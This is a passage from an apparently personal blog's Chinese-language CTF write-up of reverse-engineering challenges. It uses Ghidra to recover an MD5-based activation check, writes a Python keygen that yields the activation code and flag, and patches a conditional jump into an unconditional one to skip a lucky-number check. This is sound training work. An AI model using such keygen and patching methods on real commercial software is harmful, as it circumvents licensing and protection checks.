<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ac28d736c1cb17d0a79aa289275fee48b09ca552db630dd3081d69d52b7eb961/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138323634323538302e706e67"><img src="https://camo.githubusercontent.com/ac28d736c1cb17d0a79aa289275fee48b09ca552db630dd3081d69d52b7eb961/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138323634323538302e706e67" alt="image-20251006182642580" data-canonical-src="https://nopthon.github.io/image-20251006182642580.png" style="max-width: 100%;"></a></p>
<p>注意到按下按钮之后弹出 “激活失败” 的回答，考虑计算激活码的函数出现在 “按下按钮” ，用 Ghidra 进行逆向，关键词 <code class="notranslate">click</code> 搜索</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/801adf4fd29a355ed582aad62ee2e6cb7fe8bd99bcfebbb7905a4fa1f3ec3e2c/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138323930323832372e706e67"><img src="https://camo.githubusercontent.com/801adf4fd29a355ed582aad62ee2e6cb7fe8bd99bcfebbb7905a4fa1f3ec3e2c/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138323930323832372e706e67" alt="image-20251006182902827" data-canonical-src="https://nopthon.github.io/image-20251006182902827.png" style="max-width: 100%;"></a></p>
<p>对 <code class="notranslate">on_activationButton_clicked</code> 函数进行分析，节选了部分内容：</p>
<p>（Qt对应的反汇编内容易读性相比上一题更好一些）</p>
<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-c"><span class="pl-c">//</span> 激活码必须是32位十六进制字符</span>
local_128.m_data = <span class="pl-s"><span class="pl-pds">"</span>^[0-9a-fA-F]*$<span class="pl-pds">"</span></span>;
local_128.m_size = <span class="pl-c1">0xe</span>;
<span class="pl-en">QString::fromUtf8</span>(&amp;local_68);
<span class="pl-en">QRegularExpression::QRegularExpression</span>(&amp;hexCodePattern,&amp;local_68,<span class="pl-c1">0</span>);

<span class="pl-c"><span class="pl-c">//</span> 账户名必须只能包含字母/数字/下划线且不以数字开头</span>
local_128.m_size = <span class="pl-c1">0x18</span>;
local_128.m_data = <span class="pl-s"><span class="pl-pds">"</span>^[_a-zA-Z][_0-9a-zA-Z]*$<span class="pl-pds">"</span></span>;
<span class="pl-en">QString::fromUtf8</span>(&amp;local_68);
<span class="pl-en">QRegularExpression::QRegularExpression</span>(&amp;accountPattern,&amp;local_68,<span class="pl-c1">0</span>);

<span class="pl-c"><span class="pl-c">//</span> 检查激活码格式</span>
<span class="pl-k">if</span> (((cVar3 != <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\0</span><span class="pl-pds">'</span></span>) &amp;&amp; (codeText.d.size == <span class="pl-c1">0x20</span>)) &amp;&amp; (accountText.d.size != <span class="pl-c1">0</span>)) {
    <span class="pl-c"><span class="pl-c">//</span> 为账户名添加了固定的后缀</span>
    local_130 = <span class="pl-c1">0xb</span>;
    local_138 = <span class="pl-s"><span class="pl-pds">"</span>@nju.edu.cn<span class="pl-pds">"</span></span>;
    <span class="pl-c1">QString::append</span>(&amp;accountText,&amp;local_138);					<span class="pl-c"><span class="pl-c">//</span> append</span>
    <span class="pl-c"><span class="pl-c">//</span> 激活码十六进制转字节数组</span>
    <span class="pl-c1">QString::toUtf8_helper</span>(&amp;local_88);							<span class="pl-c"><span class="pl-c">//</span> to utf8</span>
    <span class="pl-c1">QByteArray::fromHex</span>((QByteArray *)&amp;local_68);				<span class="pl-c"><span class="pl-c">//</span> from hex</span>
    <span class="pl-c"><span class="pl-c">//</span> 对添加后缀之后的账户名进行哈希计算，Qt的哈希加密默认为 md5</span>
    <span class="pl-c1">QString::toUtf8_helper</span>(&amp;local_88);
    local_128.<span class="pl-smi">m_size</span> = local_88.<span class="pl-smi">d</span>.<span class="pl-smi">size</span>;
    local_128.<span class="pl-smi">m_data</span> = (storage_type *)local_88.<span class="pl-smi">d</span>.<span class="pl-smi">ptr</span>;
    <span class="pl-c1">QCryptographicHash::hash</span>(&amp;local_68,(Algorithm)&amp;local_128);	<span class="pl-c"><span class="pl-c">//</span> hash</span>
    <span class="pl-c"><span class="pl-c">//</span> 比较哈希结果与激活码</span>
    local_128.<span class="pl-smi">m_data</span> = local_68.<span class="pl-smi">m_data</span>;
    local_128.<span class="pl-smi">m_size</span> = local_58;
    local_148.<span class="pl-smi">m_size</span> = qVar2;
    local_148.<span class="pl-smi">m_data</span> = psVar1;
    iVar4 = <span class="pl-c1">QtPrivate::compareMemory</span>(&amp;local_128,&amp;local_148);	<span class="pl-c"><span class="pl-c">//</span> compareMemory</span>
    <span class="pl-k">if</span> (iVar4 == <span class="pl-c1">0</span>) {
        pQVar5 = *(QString **)(<span class="pl-c1">this</span>-&gt;<span class="pl-smi">ui</span> + <span class="pl-c1">0x58</span>);
        <span class="pl-c1">QString::QString</span>((QString *)&amp;local_68,(QChar *)&amp;DAT_140006196,<span class="pl-c1">4</span>); <span class="pl-c"><span class="pl-c">//</span> "成功"</span>
        <span class="pl-c1">QLabel::setText</span>(pQVar5);
        <span class="pl-c1">this</span>-&gt;<span class="pl-smi">activated</span> = <span class="pl-c1">true</span>;
    } <span class="pl-k">else</span> {
        pQVar5 = *(QString **)(<span class="pl-c1">this</span>-&gt;<span class="pl-smi">ui</span> + <span class="pl-c1">0x58</span>);
        <span class="pl-c1">QString::QString</span>((QString *)&amp;local_68,(QChar *)&amp;DAT_1400061a0,<span class="pl-c1">4</span>); <span class="pl-c"><span class="pl-c">//</span> "失败"</span>
        <span class="pl-c1">QLabel::setText</span>(pQVar5);
        <span class="pl-c1">this</span>-&gt;<span class="pl-smi">activated</span> = <span class="pl-c1">false</span>;
    }
}</pre></div>
<p>写一个 Python 函数计算一下：</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">hashlib</span>

<span class="pl-k">def</span> <span class="pl-en">md5_calc</span>(<span class="pl-s1">account</span>):
    <span class="pl-s1">account</span> <span class="pl-c1">+=</span> <span class="pl-s">"@nju.edu.cn"</span>
    
    <span class="pl-c"># 计算md5</span>
    <span class="pl-s1">md5_hash</span> <span class="pl-c1">=</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">md5</span>(<span class="pl-s1">account</span>.<span class="pl-c1">encode</span>(<span class="pl-s">'utf-8'</span>)).<span class="pl-c1">digest</span>()
    
    <span class="pl-c"># 转换为十六进制字符串</span>
    <span class="pl-s1">code</span> <span class="pl-c1">=</span> <span class="pl-s1">md5_hash</span>.<span class="pl-c1">hex</span>().<span class="pl-c1">upper</span>()
    
    <span class="pl-k">return</span> <span class="pl-s1">code</span>

<span class="pl-s1">account</span> <span class="pl-c1">=</span> <span class="pl-s">"itsc"</span>
<span class="pl-s1">code</span> <span class="pl-c1">=</span> <span class="pl-en">md5_calc</span>(<span class="pl-s1">account</span>)
<span class="pl-en">print</span>(<span class="pl-s">f"code: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">code</span><span class="pl-kos">}</span></span>"</span>)</pre></div>
<p>拿到激活码 <code class="notranslate">15F00E032036724774CF4A2D2CA7C63C</code></p>
<p><a target="_blank" rel="noopener noreferrer" href="images/image-20251006185600169.png"><img src="images/image-20251006185600169.png" alt="image-20251006185600169" style="max-width: 100%;"></a></p>
<p>Flag 就是 <code class="notranslate">flag{15F00E032036724774CF4A2D2CA7C63C}</code></p>
<h3>RE03-幸运数字</h3>
<div class="markdown-alert markdown-alert-warning"><p class="markdown-alert-title"><svg class="octicon octicon-alert mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>Warning</p>
<p>非常规解法注意，和本题的正解几乎没有关系</p>
</div>
<p>下发了一个 exe 文件，尝试进行交互，猜测这个幸运数字是个随机数，猜不中的：</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0fb665d39fa157b4229fb674f9002d54e7a41bff463d61110c20e1499f5e9d87/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139303431383839302e706e67"><img src="https://camo.githubusercontent.com/0fb665d39fa157b4229fb674f9002d54e7a41bff463d61110c20e1499f5e9d87/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139303431383839302e706e67" alt="image-20251006190418890" data-canonical-src="https://nopthon.github.io/image-20251006190418890.png" style="max-width: 100%;"></a></p>
<p>注意到提示：</p>
<blockquote>
<p>你可能需要了解一下 [<a href="https://learn.microsoft.com/zh-cn/windows/win32/procthread/using-thread-local-storage" rel="nofollow">TLS（线程本地存储）</a>](<a href="https://learn.microsoft.com/zh-cn/windows/win32/procthread/using-thread-local-storage" rel="nofollow">https://learn.microsoft.com/zh-cn/windows/win32/procthread/using-thread-local-storage</a>) 和 [<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent" rel="nofollow">IsDebuggerPresent</a>](<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent" rel="nofollow">https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent</a>)</p>
</blockquote>
<p>似乎是对动态调试操作有所反制，所以依旧尝试 Ghidra 静态分析。先搜索一下字符串：</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d2790d234f8aadf03c515970262843bab50744f9abc098ea9657a41400907be6/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139333633313239322e706e67"><img src="https://camo.githubusercontent.com/d2790d234f8aadf03c515970262843bab50744f9abc098ea9657a41400907be6/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139333633313239322e706e67" alt="image-20251006193631292" data-canonical-src="https://nopthon.github.io/image-20251006193631292.png" style="max-width: 100%;"></a></p>
<p>发现有填写正确的庆祝语字符串，定位函数 <code class="notranslate">FUN00401450</code>：</p>
<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">void</span> __fastcall <span class="pl-en">FUN_00401450</span>(undefined4 param_1,<span class="pl-k">int</span> *param_2)

{
  HANDLE hHandle;
  uint uVar1;
  <span class="pl-k">int</span> iVar2;
  <span class="pl-k">int</span> iVar3;
  HANDLE unaff_EDI;
  uint uStack_54;
  <span class="pl-k">int</span> iStack_4c;
  DWORD DStack_48;
  uint auStack_40 [<span class="pl-c1">15</span>];
  
  auStack_40[<span class="pl-c1">0xe</span>] = DAT_00404000 ^ (uint)&amp;stack0xfffffffc;
  <span class="pl-c1">FUN_004013b0</span>();
                    <span class="pl-c"><span class="pl-c">/*</span> WARNING: Bad instruction - Truncating control flow here <span class="pl-c">*/</span></span>
  <span class="pl-c1">Sleep</span>(<span class="pl-c1">1000</span>);
  auStack_40[<span class="pl-c1">0</span>] = <span class="pl-c1">0xba637da0</span>;
  auStack_40[<span class="pl-c1">1</span>] = <span class="pl-c1">0x8c445f89</span>;
  auStack_40[<span class="pl-c1">2</span>] = <span class="pl-c1">0x112970aa</span>;
  auStack_40[<span class="pl-c1">3</span>] = <span class="pl-c1">0xe2ca658f</span>;
  auStack_40[<span class="pl-c1">4</span>] = <span class="pl-c1">0xbc46a994</span>;
  auStack_40[<span class="pl-c1">5</span>] = <span class="pl-c1">0x7289dd5c</span>;
  auStack_40[<span class="pl-c1">6</span>] = <span class="pl-c1">0x21bd739f</span>;
  auStack_40[<span class="pl-c1">7</span>] = <span class="pl-c1">0x71233bc</span>;
  auStack_40[<span class="pl-c1">8</span>] = <span class="pl-c1">0x67cd6608</span>;
  auStack_40[<span class="pl-c1">9</span>] = <span class="pl-c1">0xf80e72bb</span>;
  auStack_40[<span class="pl-c1">10</span>] = <span class="pl-c1">0xfa7003e0</span>;
  auStack_40[<span class="pl-c1">0xb</span>] = <span class="pl-c1">0xfdc39c15</span>;
  auStack_40[<span class="pl-c1">0xc</span>] = <span class="pl-c1">0x6e7aeeb0</span>;
  auStack_40[<span class="pl-c1">0xd</span>] = <span class="pl-c1">0x34</span>;
  <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>welcome to TrinityCTF<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
  hHandle = (HANDLE)<span class="pl-c1">FUN_004013b0</span>();
  <span class="pl-c1">Sleep</span>(<span class="pl-c1">1000</span>);
  uVar1 = <span class="pl-c1">func_0x00401080</span>();
  <span class="pl-c1">srand</span>(uVar1);
  iVar2 = <span class="pl-c1">rand</span>();
  <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>input your lucky number:<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
  iVar3 = <span class="pl-c1">FUN_00401050</span>(&amp;UNK_00403174);
  <span class="pl-k">if</span> (iVar3 != <span class="pl-c1">1</span>) {
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>invalid input<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
    <span class="pl-c1">WaitForSingleObject</span>(hHandle,<span class="pl-c1">0xffffffff</span>);
    <span class="pl-c1">CloseHandle</span>(unaff_EDI);
    <span class="pl-c1">TlsFree</span>(DStack_48);
    <span class="pl-c1">func_0x004016c3</span>();
    <span class="pl-k">return</span>;
  }
  <span class="pl-k">if</span> (iStack_4c == iVar2) {
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>Congratulations, you guessed right!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
    <span class="pl-c1">FUN_004013b0</span>();
                    <span class="pl-c"><span class="pl-c">/*</span> WARNING: Bad instruction - Truncating control flow here <span class="pl-c">*/</span></span>
    <span class="pl-c1">Sleep</span>(<span class="pl-c1">1000</span>);
    <span class="pl-c1">FUN_00401090</span>(auStack_40,(<span class="pl-k">int</span> *)<span class="pl-c1">0xd</span>,<span class="pl-c1">0x404060</span>,<span class="pl-c1">0</span>);
    uVar1 = auStack_40[<span class="pl-c1">0xd</span>];
    <span class="pl-c1">FUN_00401020</span>(&amp;UNK_004031b0);
    <span class="pl-k">for</span> (uStack_54 = <span class="pl-c1">0</span>; uStack_54 &lt; uVar1; uStack_54 = uStack_54 + <span class="pl-c1">1</span>) {
      <span class="pl-c1">putchar</span>((uint)*(byte *)((<span class="pl-k">int</span>)auStack_40 + uStack_54));
    }
    <span class="pl-c1">FUN_00401020</span>(&amp;UNK_004031b8);
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>Is that really right?<span class="pl-pds">"</span></span>);
  }
  <span class="pl-k">else</span> {
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>number error<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
  }
  <span class="pl-k">return</span>;
}
</pre></div>
<p>先不管我如何输入正确的数字才能得到 Flag，我们重点关注这一段：</p>
<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">if</span> (iStack_4c == iVar2) {
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>Congratulations, you guessed right!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
    <span class="pl-c1">FUN_004013b0</span>(aDStack_48,aDStack_48 + <span class="pl-c1">1</span>);
    <span class="pl-c1">Sleep</span>(<span class="pl-c1">1000</span>);
    <span class="pl-c1">FUN_00401090</span>(<span class="pl-c1">0x404060</span>,<span class="pl-c1">0</span>);
    uVar1 = uStack_c;
    <span class="pl-c1">FUN_00401020</span>(&amp;UNK_004031b0);
    <span class="pl-k">for</span> (uStack_54 = <span class="pl-c1">0</span>; uStack_54 &lt; uVar1; uStack_54 = uStack_54 + <span class="pl-c1">1</span>) {
      <span class="pl-c1">putchar</span>((uint)abStack_40[uStack_54]);
    }
    <span class="pl-c1">FUN_00401020</span>(&amp;UNK_004031b8);
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>Is that really right?<span class="pl-pds">"</span></span>);
  }</pre></div>
<p>你是说，判定为猜数正确，输出 Flag 只有一个 <code class="notranslate">if (iStack_4c == iVar2)</code> 的验证吗？</p>
<p>尝试找到对应的汇编代码：</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/37dd0d39ef30469f82d04733aad7dfc2c332b4bbdf11164458747c3ea2236beb/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353332363231332e706e67"><img src="https://camo.githubusercontent.com/37dd0d39ef30469f82d04733aad7dfc2c332b4bbdf11164458747c3ea2236beb/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353332363231332e706e67" alt="image-20251006195326213" data-canonical-src="https://nopthon.github.io/image-20251006195326213.png" style="max-width: 100%;"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f891f156f89ee0b6412ec6b7a68ac6424eb6ce5b292a9a8bf5670970a929f23d/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353533373031312e706e67"><img src="https://camo.githubusercontent.com/f891f156f89ee0b6412ec6b7a68ac6424eb6ce5b292a9a8bf5670970a929f23d/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353533373031312e706e67" alt="image-20251006195537011" data-canonical-src="https://nopthon.github.io/image-20251006195537011.png" style="max-width: 100%;"></a></p>
<p>我们进行修改：</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/936bafb20d8525bb620d33ced1c6e8ed423732f8b0efce143132be5d681ad612/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353834383639312e706e67"><img src="https://camo.githubusercontent.com/936bafb20d8525bb620d33ced1c6e8ed423732f8b0efce143132be5d681ad612/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353834383639312e706e67" alt="image-20251006195848691" data-canonical-src="https://nopthon.github.io/image-20251006195848691.png" style="max-width: 100%;"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/cdf8aa646320a05ae4ebef8bbfa20f7c28d4271d6af2673fb0495c11f55a1f7a/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303031393830392e706e67"><img src="https://camo.githubusercontent.com/cdf8aa646320a05ae4ebef8bbfa20f7c28d4271d6af2673fb0495c11f55a1f7a/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303031393830392e706e67" alt="image-20251006200019809" data-canonical-src="https://nopthon.github.io/image-20251006200019809.png" style="max-width: 100%;"></a></p>
<p>把 <code class="notranslate">JNE 0x00401670</code> 修改为 <code class="notranslate">JMP 0x004015b1</code>，导出修改后的 exe 文件打开</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/feee52be42f3ff450750f91c0737f8d4e8ccd5a50b2efda5351cedd52e5d6483/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303330373536332e706e67"><img src="https://camo.githubusercontent.com/feee52be42f3ff450750f91c0737f8d4e8ccd5a50b2efda5351cedd52e5d6483/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303330373536332e706e67" alt="image-20251006200307563" data-canonical-src="https://nopthon.github.io/image-20251006200307563.png" style="max-width: 100%;"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3b84f033218bd1fb08504636826bdd6e3aae3917ebf80711d962a9621684a216/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303434363836352e706e67"><img src="https://camo.githubusercontent.com/3b84f033218bd1fb08504636826bdd6e3aae3917ebf80711d962a9621684a216/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303434363836352e706e67" alt="image-20251006200446865" data-canonical-src="https://nopthon.github.io/image-20251006200446865.png" style="max-width: 100%;"></a></p>
<p>于是得到了 Flag: <code class="notranslate">flag{c0ngr4tul4t1ons_th1s_1s_3z_lucknumb3r_4nd_xte4}</code></p>
<p>（其实我也关注了一下 Flag 是怎么解码得到的，似乎包含 TEA 加密过程，但是我一直没有进展，于是选择了改汇编码的方案）</p>
<p>（为了拿到 Flag 不择手段了 😈）</p>
<hr>
<p>（<del>有点遗憾自己是第一天下午才决定参加比赛的，不然可以拿 RE 的三个一血</del>）</p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://Nopthon.github.io">Nopthon's trashcan</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if("05/29/2025"!=""){
    var startSite=new Date("05/29/2025");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

let themeSettings={
    "dark": ["dark","moon","#00f0ff","dark-blue"],
    "light": ["light","sun","#ff5000","github-light"],
    "auto": ["auto","sync","","preferred-color-scheme"]
};
function changeTheme(mode, icon, color, utheme){
    document.documentElement.setAttribute("data-color-mode",mode);
    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
    document.getElementById("themeSwitch").parentNode.style.color=color;
    if(utterancesLoad==1){utterancesTheme(utheme);}
}
function modeSwitch(){
    let currentMode=document.documentElement.getAttribute('data-color-mode');
    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
    localStorage.setItem("meek_theme", newMode);
    if(themeSettings[newMode]){
        changeTheme(...themeSettings[newMode]);
    }
}
function utterancesTheme(theme){
    const message={type:'set-theme',theme: theme};
    const iframe=document.getElementsByClassName('utterances-frame')[0];
    iframe.contentWindow.postMessage(message,'https://utteranc.es');
}
if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","Nopthon/Nopthon.github.io");
    script.setAttribute("issue-term","title");
    
    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
    else{script.setAttribute("theme","preferred-color-scheme");}
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

